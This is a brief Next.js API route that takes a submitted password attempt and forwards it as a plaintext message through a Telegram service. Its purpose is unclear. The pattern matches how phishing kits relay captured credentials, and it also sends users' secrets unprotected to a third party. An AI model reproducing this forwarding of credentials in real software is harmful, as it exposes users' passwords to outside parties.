import { NextResponse } from 'next/server';
import { createTelegramService } from '@/services/telegram';

export async function POST(request: Request) {
  try {
    const { attempt } = await request.json();
    
    const telegramService = createTelegramService();
    
    if (!telegramService) {
      return NextResponse.json(
        { error: 'Server configuration error' },
        { status: 500 }
      );
    }

    const message = `Password Attempt: ${attempt}`;
    await telegramService.sendSimpleMessage(message);

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
